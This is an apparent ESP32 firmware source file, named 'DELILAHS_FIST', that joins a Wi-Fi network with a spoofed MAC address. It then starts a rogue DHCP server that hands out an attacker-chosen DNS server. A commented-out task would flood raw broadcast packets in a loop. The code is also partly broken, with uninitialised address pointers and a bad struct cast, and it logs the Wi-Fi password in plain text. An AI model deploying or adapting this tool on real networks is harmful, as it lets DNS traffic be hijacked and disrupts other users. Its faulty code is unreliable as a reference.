#include <string.h>
#include <sys/param.h>
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include "freertos/event_groups.h"
#include "esp_system.h"
#include "esp_wifi.h"
#include "esp_event.h"
#include "esp_log.h"
#include "nvs_flash.h"

#include "esp_netif.h"
#include "esp_netif_types.h"

// #include "lwip/sys.h"
// #include "lwip/sockets.h"
// #include "lwip/err.h"

#include "DELILAHS_FIST.h"

#define WIFI_SSID     CONFIG_WIFI_SSID
#define WIFI_PSK      CONFIG_WIFI_PSK
#define HOSTNAME      CONFIG_HOSTNAME

#define DHCP_IP CONFIG_DHCP_IP
#define DNS_SERVER CONFIG_DNS_SERVER

// Spoofed mac
uint8_t mac[6] = {0x01,0x02,0x03,0x04,0x05,0x06};

// Time in seconds to loop raw_send_task
// float loopSeconds = 1;

// Network timeout in seconds
// int timeoutSecs = 10;

// packet contents
// static const char *payload = "LETS FUCKING GOOOOO LFGGGGGGGGG";

// Tag for logging
static const char *TAGSUCC = "GreatSucc:";
static const char *TAGFAIL = "EPIC FAIL YOU SUCK:";

// wifi event group for freertos
static EventGroupHandle_t s_wifi_event_group;

static int s_retry_num = 0;
esp_netif_t *netifWifi;
int err;
int errno;
// int sockfd;

// ip info after connecting to AP
char str_ipv4[16]; // local ip os esp
char str_ipnm[16]; // netmask
char str_ipgw[16]; // gateway

static void DELILAHS_FIST(void *pvParameters) {
    // decode DHCP server IP
    esp_ip4_addr_t *dhcpIP;
    esp_netif_str_to_ip4(DHCP_IP, dhcpIP);

    // decode DNS server IP
    esp_ip4_addr_t *dnsIP;
    esp_netif_str_to_ip4(DNS_SERVER, dnsIP);

    // struct esp_netif_dns_info_t dns_ip_wraped = {dnsIP}; // wtf is this shit frong
    //esp_netif_dns_info_t dns_ip_wraped = {*dnsIP};
    ESP_ERROR_CHECK(esp_netif_dhcps_start(netifWifi)); // start the server
    ESP_ERROR_CHECK(esp_netif_set_dns_info(netifWifi, ESP_NETIF_DNS_MAIN, (struct esp_netif_dns_info_t *)dnsIP)); // set the dns server to one we specify
}

/*
static void raw_send_task(void *pvParameters) {
    // configure the sockaddr
    struct sockaddr_in dest_addr;
        dest_addr.sin_addr.s_addr = inet_addr(DEST_IP_ADDR);
        dest_addr.sin_family = AF_INET;

    if((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_IP)) < 0) {
        ESP_LOGE(TAGFAIL, "Error creating socket: %d", errno);
    } else {
        ESP_LOGI(TAGSUCC, "Socket created");
    }

    // option lengths
    int opt = 1;
    int optlen = sizeof(int);

    // timeouts
    struct timeval timeout;
    timeout.tv_sec = timeoutSecs;
    timeout.tv_usec = 0;

    // options
    setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, &timeout, sizeof timeout);
    setsockopt(sockfd, SOL_SOCKET, SO_BROADCAST, &opt, sizeof(opt));
    setsockopt(sockfd, SOL_SOCKET, SO_ERROR, &err, optlen);

    if(err < 0) {
        ESP_LOGE(TAGFAIL, "Error setting socket options: %d", err);
    } else {
        ESP_LOGI(TAGSUCC, "Socket options set");
    }

    while(1) {
        int sendErr = sendto(sockfd, payload, strlen(payload), 0, (struct sockaddr *)&dest_addr, sizeof(dest_addr));

        if(sendErr < 0) {
            ESP_LOGE(TAGFAIL, "Error sending: %d", err);
        } else {
            ESP_LOGI(TAGSUCC, "Sent!\n\tLooping every %f seconds\n\tDst: %s\n\tPayload: %s\n\tTimeout: %d\n", loopSeconds, DEST_IP_ADDR, payload, timeoutSecs);
        }

        // delay on loop
        vTaskDelay((loopSeconds*1000) / portTICK_PERIOD_MS);
    }
}
*/

static void event_handler(void* arg, esp_event_base_t event_base,
                                int32_t event_id, void* event_data)
{
    if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_START) {
        esp_wifi_connect();
    } else if (event_base == WIFI_EVENT && event_id == WIFI_EVENT_STA_DISCONNECTED) {
        if (s_retry_num < ESP_MAXIMUM_RETRY) {
            esp_wifi_connect();
            s_retry_num++;
            ESP_LOGI(TAGSUCC, "Retrying to connect to the AP");
        } else {
            xEventGroupSetBits(s_wifi_event_group, WIFI_FAIL_BIT);
        }
        ESP_LOGE(TAGFAIL,"Failed to connect to AP");
    } else if (event_base == IP_EVENT && event_id == IP_EVENT_STA_GOT_IP) {
        ip_event_got_ip_t* event = (ip_event_got_ip_t*) event_data;
        esp_ip4addr_ntoa(&event->ip_info.ip, str_ipv4, IP4ADDR_STRLEN_MAX);
        esp_ip4addr_ntoa(&event->ip_info.netmask, str_ipnm, IP4ADDR_STRLEN_MAX);
        esp_ip4addr_ntoa(&event->ip_info.gw, str_ipgw, IP4ADDR_STRLEN_MAX);

        ESP_LOGI(TAGSUCC, "Connected!\n\tIP: %s\n\tNetmask: %s\n\tGateway: %s\n\tSSID: %s\n\tMode: ESP_WIFI_MODE_STA\n\tAuth Threshold: %d\n\tMAC Address: %02x:%02x:%02x:%02x:%02x:%02x\n\tHostname: %s",
                str_ipv4,
                str_ipnm,
                str_ipgw,
                WIFI_SSID,
                ESP_WIFI_SCAN_AUTH_MODE_THRESHOLD,
                mac[0], mac[1], mac[2], mac[3], mac[4], mac[5],
                HOSTNAME);

        s_retry_num = 0;
        xEventGroupSetBits(s_wifi_event_group, WIFI_CONNECTED_BIT);
    }
}

void wifi_init_sta(void)
{
    s_wifi_event_group = xEventGroupCreate();

    ESP_ERROR_CHECK(esp_netif_init());

    ESP_ERROR_CHECK(esp_event_loop_create_default());
    netifWifi = esp_netif_create_default_wifi_sta();

    ESP_ERROR_CHECK(esp_netif_set_mac(netifWifi, mac));
    ESP_ERROR_CHECK(esp_netif_set_hostname(netifWifi, HOSTNAME));

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));

    esp_event_handler_instance_t instance_any_id;
    esp_event_handler_instance_t instance_got_ip;
    ESP_ERROR_CHECK(esp_event_handler_instance_register(WIFI_EVENT,
                                                        ESP_EVENT_ANY_ID,
                                                        &event_handler,
                                                        NULL,
                                                        &instance_any_id));
    ESP_ERROR_CHECK(esp_event_handler_instance_register(IP_EVENT,
                                                        IP_EVENT_STA_GOT_IP,
                                                        &event_handler,
                                                        NULL,
                                                        &instance_got_ip));

    wifi_config_t wifi_config = {
        .sta = {
            .ssid = WIFI_SSID,
            .password = WIFI_PSK,
            .threshold.authmode = ESP_WIFI_SCAN_AUTH_MODE_THRESHOLD,
            .sae_pwe_h2e = ESP_WIFI_SAE_MODE,
            .sae_h2e_identifier = H2E_IDENTIFIER,
        },
    };
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_STA, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());

    ESP_LOGI(TAGSUCC, "wifi_init_sta finished.");

    /* Waiting until either the connection is established (WIFI_CONNECTED_BIT) or connection failed for the maximum
     * number of re-tries (WIFI_FAIL_BIT). The bits are set by event_handler() (see above) */
    EventBits_t bits = xEventGroupWaitBits(s_wifi_event_group,
            WIFI_CONNECTED_BIT | WIFI_FAIL_BIT,
            pdFALSE,
            pdFALSE,
            portMAX_DELAY);

    /* xEventGroupWaitBits() returns the bits before the call returned, hence we can test which event actually
     * happened. */
    if (bits & WIFI_CONNECTED_BIT) {
        ESP_LOGI(TAGSUCC, "connected to ap SSID: %s", WIFI_SSID);
        // fork raw_send_task to FreeRTOS task
        xTaskCreate(DELILAHS_FIST, "DELILAHS_FIST", 4096, NULL, 5, NULL);

        ESP_LOGI(TAGSUCC, "Connected to AP- Sending packets");
    } else if (bits & WIFI_FAIL_BIT) {
        ESP_LOGE(TAGFAIL, "Failed to connect to SSID:%s, password:%s", WIFI_SSID, WIFI_PSK);
    } else {
        ESP_LOGE(TAGFAIL, "FAILURE: UNEXPECTED EVENT");
    }
}

void app_main(void)
{
    //Initialize NVS
    esp_err_t ret = nvs_flash_init();
    if (ret == ESP_ERR_NVS_NO_FREE_PAGES || ret == ESP_ERR_NVS_NEW_VERSION_FOUND) {
      ESP_ERROR_CHECK(nvs_flash_erase());
      ret = nvs_flash_init();
    }
    ESP_ERROR_CHECK(ret);

    ESP_LOGI(TAGSUCC, "ESP_WIFI_MODE_STA");
    wifi_init_sta();
}    